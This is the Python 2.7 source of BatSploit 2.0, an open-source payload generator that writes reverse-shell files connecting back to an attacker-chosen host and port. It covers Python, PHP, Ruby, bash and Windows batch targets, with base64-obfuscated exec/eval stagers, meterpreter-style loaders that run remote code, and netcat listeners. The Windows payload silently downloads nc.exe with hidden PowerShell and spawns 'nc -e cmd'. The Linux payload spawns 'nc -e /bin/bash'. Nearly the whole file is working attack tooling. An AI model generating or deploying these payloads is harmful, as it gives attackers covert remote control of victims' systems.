#-*-coding: utf8-*-
'''
@Author : Daniel Victor Freire Feitosa
@Version : 2.0
@Name : BatSploit
@Language : Python 2.7

<danielfreire56@hotmail.com>

Tool Open-Source, qualquer mudança pra melhor é bem vinda, os textos estão em inglês pq é mais simples não ter
que acentuar tudo, e também é uma língua universal, mas os comentários estão em pt-br 
'''
import os, sys
try:
	from colorama import init
	from termcolor import colored
	init()
except ImportError:
	sys.stdout.write("[!] Some modules needed to use BatSploit 2\n[*] Run : setup.py\n")
	sys.exit()

class BatSploit(object):

	def __init__(self, name, version, platform):
		self.platform = platform
		self.name = name
		self.version = version
	
	def banner(self):
		if self.platform == "Windows":
			os.system("cls") # if windows
		else:
			os.system("clear") # if linux or mac
		#sys.stdout.write(colored("     _{___{__}\n", "white"))
		#sys.stdout.write(colored("    {_}      `\)\n", "white"))           
		#sys.stdout.write(colored("   {_}        `            _.-''''--.._\n", "white"))
		#sys.stdout.write(colored("   {_}                    //'.--.  \___`.\n", "white"))
		#sys.stdout.write(colored("    { }__,_.--~~~-~~~-~~-::.---. `-.\  `.)\n", "white"))
		#sys.stdout.write(colored("     `-.{_{_{_{_{_{_{_{_//  -- 8;=- `\n", "white"))
		#sys.stdout.write(colored("        `-:,_.:,_:,_:,.`\\._ ..'=- , \n", "white"))
		#sys.stdout.write(colored("            // // // //`-.`\`   .-'/\n", "white"))
		#sys.stdout.write(colored("  BatSploit 2.0", "green"))
		#sys.stdout.write(colored(" << << << <<    \ `--'  /---)\n", "white"))
		#sys.stdout.write(colored("            ^  ^  ^  ^     `-.....--'''\n", "white"))
		print ""
		print colored(" _____________", "white")
		print colored("<", "white") + colored(" BatSploit 2 ", "green") + colored(">", "white")
		print colored(" -------------", "white")
		print colored("       \   ,__,", "white")
		print colored("        \  (oo)____", "white")
		print colored("           (__)    )\\", "white")
		print colored("              ||--|| *", "white")
		sys.stdout.write(colored("\n @Author : Daniel Victor Freire\n", "grey"))
		sys.stdout.write(colored(" @Version : 2.0.0\n", "grey"))
		sys.stdout.write(colored(" <danielfreire56@hotmail.com>\n", "grey"))

	def usage(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage of tool ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -list : List all payloads\n", "white"))
		sys.stdout.write(colored("[+] "+name, "green"))
		sys.stdout.write(colored(" -bind : Start handler to audit payloads\n", "white"))
		sys.stdout.write(colored("[+] "+name, "green"))
		sys.stdout.write(colored(" -payload : Create payloads\n", "white"))

	def usage_bind(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -bind LHOST=127.0.0.1 LPORT=1337\n", "white"))

	def usage_payload(self, argv):
		name_script = argv.split("\\") # windows only
		try:
			index_name = len(name_script) - 1 
			name = name_script[index_name] # nome do script no windows
		except IndexError:
			name = argv
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Usage to start handler ", "white"))
		sys.stdout.write(colored("======\n", "green"))
		sys.stdout.write(colored("\n[+] "+name, "green"))
		sys.stdout.write(colored(" -payload python/batsploit/reverse_tcp LHOST=127.0.0.1 LPORT=1337 payload.py\n", "white"))

	def list_payloads(self):
		# essa função lista os payloads
		print "\n[!] Payloads List"
		payloads = ['python/netcat/reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'windows/netcat/reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
		for payload in payloads:
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored(payload, "white"))
		print ""
	def bind(self, lhost, lport):
		if not lhost:
			sys.stdout.write(colored("\n[-] ", "red"))
			sys.stdout.write(colored("Set example : LHOST=127.0.0.1\n", "white"))
		elif not lport:
			sys.stdout.write(colored("\n[-] ", "red"))
			sys.stdout.write(colored("Set example : LPORT=1337\n", "white"))
		host = lhost.split("=")[1] # local host para escutar a conexão
		port = lport.split("=")[1] # local port para escutar a conexão
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Handler started at %s:%s "%(host, port), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if self.platform == "Windows":
			os.system("start handler.py %s %s"%(host, port))
		elif self.platform == "Linux":
			os.system("gnome-terminal python handler.py %s %s"%(host, port))

	def nc_bind(self, lhost, lport):
		# isso escuta as conecxoes com netcat
		host = lhost.split("=")[1]
		port = lport.split("=")[1]
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Handler started at %s:%s "%(host, port), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if self.platform == "Windows":
			os.system("start nc.exe -nvlp %s"%(port))
		elif self.platform == "Linux":
			os.system("gnome-terminal nc -nvlp %s"%(port))

	def create_payload(self, payload, lhost, lport, name):
		host = lhost.split("=")[1] # local host para o payload se conectar
		port = int(lport.split("=")[1]) # local port para o payload se conectar
		sys.stdout.write(colored("\n ======", "green"))
		sys.stdout.write(colored(" Creating Payload : %s "%(payload), "white"))
		sys.stdout.write(colored("======\n", "green"))
		if payload == 'python/netcat/reverse_tcp':
			# code ...
			code = "import socket,os\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('%s', %i))\n"%(host, port)
			code += "while True:\n"
			code += "	s.send(os.popen(s.recv(1024)).read())"
			encode = code.encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "string = '%s'\n"%(encode)
			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'python/batsploit/reverse_tcp':
			# code
			code = "import socket, os\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('%s', %i))\n"%(host, port)
			code += "s.send('[~] Garanted Access by BatSploit 2.0 [~]')\n"
			code += "while True:\n"
			code += "	saida_cmd = os.popen(s.recv(1024)).read()\n"
			code += "	if len(saida_cmd) == 0:\n"
			code += "		saida_cmd = '[+] Executed !'\n"
			code += "	s.send(saida_cmd)"
			encode = code.encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "string = '%s'\n"%(encode)
			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'windows/netcat/reverse_tcp':
			# code 
			code = "@echo off\n"
			code += "color 7f && mode 20, 10\n"
			code += "cd %TEMP%\n"
			code += "echo powershell(New-Object System.Net.WebClient).DownloadFile('http://github.com/proxyanon/BatSploit/raw/master/nc.exe', 'nc.exe') > bd.bat\n"
			code += "echo nc.exe %s %i -e cmd >> bd.bat\n"%(host, port)
			code += "powershell -W hidden ./bd.bat"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'linux/netcat/reverse_tcp':
			# code
			code = "#!/bin/bash\n"
			code += "nc %s %i -e /bin/bash &> dismown && clear"%(host, port)
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'php/socket/reverse_tcp':
			# code 
			code = "<?php\n"
			code += "$s = socket_create(AF_INET, SOCK_STREAM, 0);\n"
			code += "$con = socket_connect($s, '%s', %i);\n"%(host, port)
			code += "while(1==1):\n"
			code += "	socket_write($s, fread(popen(socket_read($s, 1024), 'r'), 10024));\n"
			code += "endwhile;\n"
			code += "?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'python/meterpreter/reverse_tcp':
			# code ...
			code = "import socket,struct\n"
			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
			code += "s.connect(('%s', %i))\n"%(host, port)
			code += "l=struct.unpack('>I',s.recv(4))[0]\n"
			code += "while s.recv(l)<l:\n"
			code += "	s.recv(l-len(s.recv(l)))\n"
			code += "exec(s.recv(l),{'s':s})"
			encode = code.encode('base64').encode('base64').replace("\n", "") # isso codifica o código
			payload_coded = "exec('%s'.decode('base64').decode('base64'))"%(encode) # isso decodifica e executa o payload
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'php/netcat/reverse_tcp':
			# code ...
			code = "$s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;"%(host, port)
			encode = code.encode('base64').replace("\n", "")
			payload_coded = "<?php $string=base64_decode('%s');\n"%(encode)
			payload_coded += "eval($string);?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded)
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == 'ruby/netcat/reverse_tcp':
			# code ...
			code = "require 'socket'\n"
			code += "s=TCPSocket.open('%s', %i)\n"%(host,port)
			code += "while msg = s.gets\n"
			code += "	IO.popen(msg, 'r') do |pipe|\n"
			code += "		s.puts pipe.gets\n"
			code += "	end\n"
			code += "end\n"
			code += "s.close"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(code) # escreve o código no arquivo
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
		elif payload == "php/meterpreter/reverse_tcp":
			# code ...
			code = "$host = '%s';\n"%(host)
			code += "$port = %i;\n"%(port)
			code += "$s = fsockopen($host, $port);\n"
			code += "$s_type = 'stream';\n"
			code += "$len = fread($s, 4);\n"
			code += '$a = unpack("Nlen", $len);'
			code += "\n$len = $a['len'];\n"
			code += "$b = '';\n"
			code += "while(strlen($b) < $len){\n"
			code += "	switch($s_type){\n"
			code += "		case 'stream': $b .= fread($s, $len-strlen($b)); break;\n"
			code += "	}\n"
			code += "}\n"
			code += "$GLOBALS['msgsock'] = $s;\n"
			code += "$GLOBALS['msgsock_type'] = $s_type;\n"
			code += "eval($b);\n"
			code += "die();"
			encode = code.encode('base64').replace("\n", "");
			payload_coded = "<?php\n"
			payload_coded += "$string=base64_decode('%s');\n"%(encode)
			payload_coded += "eval($string);\n"
			payload_coded += "?>"
			payload_file = open(name, 'w') # abri o arquivo dst
			payload_file.write(payload_coded)
			payload_file.close() # fecha o arquivo
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s "%(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
			if self.platform == "Windows":
				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
			elif self.platform == "Linux":
				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
